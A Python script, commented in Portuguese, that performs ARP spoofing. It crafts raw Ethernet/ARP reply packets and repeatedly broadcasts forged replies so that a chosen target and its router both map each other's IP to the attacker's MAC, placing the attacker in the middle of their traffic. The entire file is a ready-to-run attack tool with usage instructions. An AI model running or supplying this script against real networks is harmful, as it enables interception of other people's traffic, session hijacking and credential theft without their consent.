import socket
import struct
import time

# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# Função para criar um pacote ARP
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
def create_arp_packet(opcode: int, sender_mac: str, sender_ip: str, target_mac: str, target_ip: str) -> bytes:
    """
    Cria um pacote ARP (Ethernet + ARP Header).
    """
    sender_mac_bytes = bytes.fromhex(sender_mac.replace(":", ""))
    target_mac_bytes = bytes.fromhex(target_mac.replace(":", ""))
    sender_ip_bytes = socket.inet_aton(sender_ip)
    target_ip_bytes = socket.inet_aton(target_ip)

    # Cabeçalho Ethernet
    eth_header = struct.pack(
        "!6s6sH",
        target_mac_bytes, sender_mac_bytes, 0x0806
    )

    # Cabeçalho ARP
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, opcode,
        sender_mac_bytes, sender_ip_bytes,
        target_mac_bytes, target_ip_bytes
    )

    return eth_header + arp_header

# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# Função principal para realizar o ARP Spoofing
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
def arp_spoof(interface: str, target_ip: str, router_ip: str, attacker_mac: str) -> None:
    """
    Realiza o ataque ARP Spoofing.
    """
    try:
        # Criar socket RAW com AF_PACKET para Ethernet
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        sock.bind((interface, 0))  # Associar à interface de rede

        print(f"Iniciando ARP Spoofing na interface {interface}...")
        print(f"Alvo: {target_ip} | Roteador: {router_ip}")

        while True:
            # Criar pacotes ARP
            target_packet = create_arp_packet(
                opcode=2, sender_mac=attacker_mac,
                sender_ip=router_ip,
                target_mac="ff:ff:ff:ff:ff:ff",
                target_ip=target_ip
            )

            router_packet = create_arp_packet(
                opcode=2, sender_mac=attacker_mac,
                sender_ip=target_ip,
                target_mac="ff:ff:ff:ff:ff:ff",
                target_ip=router_ip
            )

            # Enviar pacotes ARP
            sock.send(target_packet)
            sock.send(router_packet)

            print(f"Pacotes enviados: Alvo -> {target_ip}, Roteador -> {router_ip}")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nAtaque interrompido pelo usuário.")
    except Exception as e:
        print(f"Erro: {e}")
    finally:
        sock.close()

# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# Entrada principal do programa
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
if __name__ == "__main__":
    import sys

    if len(sys.argv) != 5:
        print("Uso: sudo python3 arp_spoof.py <interface> <IP alvo> <IP roteador> <MAC do atacante>")
        print("Exemplo: sudo python3 arp_spoof.py en0 192.168.1.5 192.168.1.1 12:34:56:78:9A:BC")
        sys.exit(1)

    interface = sys.argv[1]
    target_ip = sys.argv[2]
    router_ip = sys.argv[3]
    attacker_mac = sys.argv[4]

    arp_spoof(interface, target_ip, router_ip, attacker_mac)
